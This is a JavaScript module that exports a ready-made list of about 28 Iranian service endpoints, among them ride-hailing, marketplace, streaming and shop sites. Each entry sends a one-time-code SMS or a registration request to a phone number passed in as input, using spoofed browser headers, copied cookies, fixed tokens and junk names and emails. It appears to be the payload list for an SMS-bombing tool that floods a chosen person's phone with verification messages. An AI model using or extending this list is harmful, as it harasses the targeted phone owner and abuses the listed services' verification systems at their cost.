const randomnum = Math.floor(Math.random() * 1000000)

module.exports = ({ number }) => {
    list = [
        {
            "url": "https://shadmessenger12.iranlms.ir",
            "data": {
                "api_version": "3",
                "method": "sendCode",
                "data": {
                    "phone_number": `+98${number}`,
                    "send_type": "SMS"
                }
            },
            "name": "shad",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            "data": { cellphone: `+98${number}` },
            "headers": {
                "Host": "app.snapp.taxi",
                "content-length": "29",
                "x-app-name": "passenger-pwa",
                "x-app-version": "5.0.0",
                "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://app.snapp.taxi",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"
            },
            "name": "snapp",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": { "UserName": `+98${number}` },
            "name": "namava",
            "type": "APK",
            "method": "POST"
        },
        {
            "url": "https://allinco.ir/api/Users/signIn",
            "data": {
                "deviceId": "86eb30f27c0b58bb",
                "hashCode": "Aq1/XpLps/v",
                "mobile": `0${number}`
            },
            "name": "allinco",
            "type": "APK",
            "method": "POST"
        },
        {
            "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
            "data": { "phone_number": `0${number}` },
            "name": "komodaa",
            "type": "APK",
            "method": "POST"
        },
        {
            "url": "https://baarbaanet.com/Barbanet/rest/pub/user/otp/send",
            "data": {
                "mobile": `0${number}`,
                "viaSms": true,
                "viaEmail": false
            },
            "name": "baarbaanet",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://bornosmode.com/api/loginRegister/",
            "data": {
                mobile: `0${number}`,
                withOtp: 1
            },
            "name": "bornosmode",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://livito.tv/api/oauth/initialize",
            "data": {
                "grant_type": "password",
                "channel": "PASSWORD",
                "scope": "*",
                "username": `0${number}`
            },
            "name": "livito",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://b2n.ir/lib/phone.php",
            "data": {
                "type": "1",
                "phone": `0${number}`
            },
            "name": "b2n",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": { "phone": `0${number}` },
            "name": "divar",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://api.zarinplus.com/user/zarinpal-login",
            "data": { "phone_number": `98${number}` },
            "name": "zarinplus",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": "https://api.tapsi.cab/api/v2.2/user",
            "data": {
                "credential": {
                    "phoneNumber": `0${number}`,
                    "role": "PASSENGER"
                },
                "otpOption": "SMS"
            },
            "name": "tapsi",
            "type": "WEB",
            "method": "POST"
        },
        {
            "url": `https://api.torob.com/a/phone/send-pin/?phone_number=0${number}`,
            "name": "torob",
            "headers": {
                "Host": "api.torob.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "accept": "*/*",
                "origin": "https://torob.com",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://torob.com/user/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6",
                "cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"
            },
            "type": "WEB"
        },
        {
            "url": `https://core.gap.im/v1/user/add.json?mobile=0${number}`,
            "headers": {
                "Host": "core.gap.im",
                "accept": "application/json, text/plain, */*",
                "x-version": "4.5.7",
                "accept-language": "fa",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
                "appversion": "web", "origin": "https://web.gap.im",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://web.gap.im/",
                "accept-encoding": "gzip, deflate, br"
            },
            "name": "coregap",
            "type": "WEB"
        },
        {
            "url": `https://zancoiran.com:5050/Main/SiteBaseApi/GenerateMobileKey?mobileno=0${number}`,
            "name": "zancoiran",
            "type": "WEB"
        },
        {
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": { "phoneNumber": `0${number}` },
            "name": "alibaba",
            "type": "WEB",
        },
        // rand mail required
        {
            "url": "https://api2.hitro.mobi/api/passengerinfo/InsertPassenger",
            "data": {
                "ClientId": `0${number}`,
                "ClientSecret": "0501098153736800398716253736091541224",
                "Name": "kdccs",
                "Family": "kdccs",
                "Email": `kdccs${randomnum}du@gmail.com`
            },
            "name": "hitro",
            "type": "WEB",
        },
        {
            "url": "https://www.delino.com/user/register",
            "data": { "mobile": `0${number}` },
            "name": "delino",
            "type": "WEB",
        },
        {
            "url": "https://api.behtarino.com/api/v1/businesses/uqqnffxwen/vitrin_verification/",
            "data": { "phone": `0${number}` },
            "name": "behtarino",
            "type": "WEB",
        },
        {
            "url": "https://customer.didofood.co/api/v1/CustomersRegistrations/send_activation_code",
            "data": {
                "mobile": `${number}`,
                "country_id": 1
            },
            "name": "didofood",
            "type": "WEB",
        },
        // start andorid api section
        {
            "url": "https://qestabad.com/wp-admin/admin-ajax.php",
            "data": "action=digits_check_mob&countrycode=%2B98&mobileNo=" + `${number}` + "&csrf=014e798716&login=2&username=wdawdwadwadawd&=&=&=&digits=1&json=1&=0&digits_reg_%D8%AD%D8%B1%DB%8C%D9%85%D8%AE%D8%B5%D9%88%D8%B5%DB%8C=1&=wdawdwadwadawd&digregcode=%2B98&=912 839 2129&=&=&=&dig_nounce=014e798716",
            "name": "qestabad",
            "type": "APK",
            "method": "POST",
            "package_name": "com.qestabad.online.novinappsaz",
            "headers": {
                'Host': 'qestabad.com',
                'Content-Length': '277',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; SM-N976N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://qestabad.com',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://qestabad.com/my-account/?login=true&back=home&page=1',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cookie': 'digits_countrycode=98'
            },
        },
        {
            "url": "http://behtamarket.com//getRegister.php?n=shinaweb&activeBySms=true",
            "data": "e=0" + `${number}` + "&adres=&p=r%24%24tme1&name=wadawdawdawd&em=&moaref=&bazaryab_code=&shahrestan_id=0&codeposti=&tel=",
            "name": "behtamarket",
            "type": "APK",
            "method": "POST",
            "package_name": "com.persiandesigners.behtamarket",

        },
        {
            "url": `https://api.arasta360.com/api/account/token?phoneNumber=0${number}`,
            "name": "arasta360",
            "type": "WEB",
            "method": "POST",
        },
        {
            "url": "https://kasbinoapp.ir/kasbinoEngine1/RequestC",
            "data": `{"p1001":"0${number}","p1002":"registerSms","token":"e0d4cc39-b5d3-47ea-8ede-6ead5eed3b8a.e000af00-d00d-0da0-0f00-000d00000cc0","RC":"7be86c2a5b54"}`,
            "name": "kasbinoapp",
            "type": "WEB",
            "method": "POST",
        },
        {
            "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
            "data": {
                "code": "98",
                "phone": `${number}`,
                "smsStatus": "default"
            },
            "name": "telewebion",
            "type": "WEB",
            "method": "POST",
        },
        {
            "url": "http://civapp.ir//getRegister.php?n=shinaweb&activeBySms=true",
            "data": "e=0" + `${number}` + "&adres=&p=r%24%24tme1&name=wadawdawdawd&em=&moaref=&bazaryab_code=&shahrestan_id=0&codeposti=&tel=",
            "name": "civapp",
            "type": "APK",
            "method": "POST",
            "package_name": "com.persiandesigners.civapp",
        }
    ]
}
